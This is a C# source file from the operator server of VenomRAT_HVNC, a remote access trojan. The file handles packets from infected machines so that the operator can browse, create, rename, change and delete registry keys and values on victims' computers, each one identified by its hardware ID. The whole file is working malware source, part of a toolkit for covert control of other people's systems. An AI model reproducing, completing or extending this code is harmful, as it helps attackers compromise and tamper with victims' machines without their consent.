using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using ProtoBuf;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    internal class HandleRegManager
    {
        public void RegManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "setClient":
                        {
                            FormRegistryEditor formRegistryEditor4 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor4 != null && formRegistryEditor4.Client == null)
                            {
                                client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                                formRegistryEditor4.Client = client;
                                formRegistryEditor4.timer1.Enabled = true;
                            }
                            break;
                        }
                    case "CreateKey":
                        {
                            FormRegistryEditor formRegistryEditor8 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor8 != null)
                            {
                                string asString15 = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                byte[] asBytes2 = unpack_msgpack.ForcePathObject("Match").GetAsBytes();
                                formRegistryEditor8.CreateNewKey(asString15, DeSerializeMatch(asBytes2));
                            }
                            break;
                        }
                    case "LoadKey":
                        {
                            FormRegistryEditor formRegistryEditor9 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor9 != null)
                            {
                                string asString16 = unpack_msgpack.ForcePathObject("RootKey").AsString;
                                byte[] asBytes3 = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();
                                formRegistryEditor9.AddKeys(asString16, DeSerializeMatches(asBytes3));
                            }
                            break;
                        }
                    case "DeleteKey":
                        {
                            FormRegistryEditor formRegistryEditor6 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor6 != null)
                            {
                                string asString10 = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                string asString11 = unpack_msgpack.ForcePathObject("KeyName").AsString;
                                formRegistryEditor6.DeleteKey(asString10, asString11);
                            }
                            break;
                        }
                    case "RenameKey":
                        {
                            FormRegistryEditor formRegistryEditor2 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor2 != null)
                            {
                                string asString2 = unpack_msgpack.ForcePathObject("rootKey").AsString;
                                string asString3 = unpack_msgpack.ForcePathObject("oldName").AsString;
                                string asString4 = unpack_msgpack.ForcePathObject("newName").AsString;
                                formRegistryEditor2.RenameKey(asString2, asString3, asString4);
                            }
                            break;
                        }
                    case "CreateValue":
                        {
                            FormRegistryEditor formRegistryEditor7 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor7 != null)
                            {
                                string asString12 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                string asString13 = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                                string asString14 = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                                RegistryValueKind kind = RegistryValueKind.None;
                                switch (asString13)
                                {
                                    case "-1":
                                        kind = RegistryValueKind.None;
                                        break;

                                    case "0":
                                        kind = RegistryValueKind.Unknown;
                                        break;

                                    case "1":
                                        kind = RegistryValueKind.String;
                                        break;

                                    case "2":
                                        kind = RegistryValueKind.ExpandString;
                                        break;

                                    case "3":
                                        kind = RegistryValueKind.Binary;
                                        break;

                                    case "4":
                                        kind = RegistryValueKind.DWord;
                                        break;

                                    case "7":
                                        kind = RegistryValueKind.MultiString;
                                        break;

                                    case "11":
                                        kind = RegistryValueKind.QWord;
                                        break;
                                }
                                RegistrySeeker.RegValueData regValueData = new RegistrySeeker.RegValueData();
                                regValueData.Name = asString14;
                                regValueData.Kind = kind;
                                regValueData.Data = new byte[0];
                                formRegistryEditor7.CreateValue(asString12, regValueData);
                            }
                            break;
                        }
                    case "DeleteValue":
                        {
                            FormRegistryEditor formRegistryEditor5 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor5 != null)
                            {
                                string asString8 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                string asString9 = unpack_msgpack.ForcePathObject("ValueName").AsString;
                                formRegistryEditor5.DeleteValue(asString8, asString9);
                            }
                            break;
                        }
                    case "RenameValue":
                        {
                            FormRegistryEditor formRegistryEditor3 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor3 != null)
                            {
                                string asString5 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                string asString6 = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                                string asString7 = unpack_msgpack.ForcePathObject("NewValueName").AsString;
                                formRegistryEditor3.RenameValue(asString5, asString6, asString7);
                            }
                            break;
                        }
                    case "ChangeValue":
                        {
                            FormRegistryEditor formRegistryEditor = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (formRegistryEditor != null)
                            {
                                string asString = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                byte[] asBytes = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
                                formRegistryEditor.ChangeValue(asString, DeSerializeRegValueData(asBytes));
                            }
                            break;
                        }
                }
            }
            catch
            {
            }
        }

        public static RegistrySeeker.RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
        {
            using MemoryStream memoryStream = new MemoryStream(bytes);
            return Serializer.Deserialize<RegistrySeeker.RegSeekerMatch[]>((Stream)memoryStream);
        }

        public static RegistrySeeker.RegSeekerMatch DeSerializeMatch(byte[] bytes)
        {
            using MemoryStream memoryStream = new MemoryStream(bytes);
            return Serializer.Deserialize<RegistrySeeker.RegSeekerMatch>((Stream)memoryStream);
        }

        public static RegistrySeeker.RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            using MemoryStream memoryStream = new MemoryStream(bytes);
            return Serializer.Deserialize<RegistrySeeker.RegValueData>((Stream)memoryStream);
        }
    }
}